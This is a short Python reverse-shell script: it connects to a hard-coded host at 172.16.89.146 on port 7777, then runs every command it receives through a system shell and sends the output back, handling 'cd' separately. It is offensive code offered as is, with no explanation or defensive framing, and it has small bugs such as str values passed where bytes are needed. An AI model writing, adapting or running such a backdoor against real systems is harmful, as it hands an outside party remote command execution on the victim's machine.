#!/user/bin/env python
#_*_ coding: utf8 _*_

from base64 import decode, encode
import socket
import os
import subprocess



def shell():
    current_dir = os.getcwd()
    cliente.send(current_dir.encode('utf8'))
    while True:
        res = cliente.recv(1024).decode('utf8')
        if res == "exit":
            break
        elif res[:2] == "cd" and len(res) > 2:
            os.chdir(res[3:])
            result = os.getcwd()
            cliente.send(result)
        else:
            proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result) == 0:
                cliente.send("1")
            else:
              cliente.send(result)

cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cliente.connect(("172.16.89.146",7777))
shell()
cliente.close()

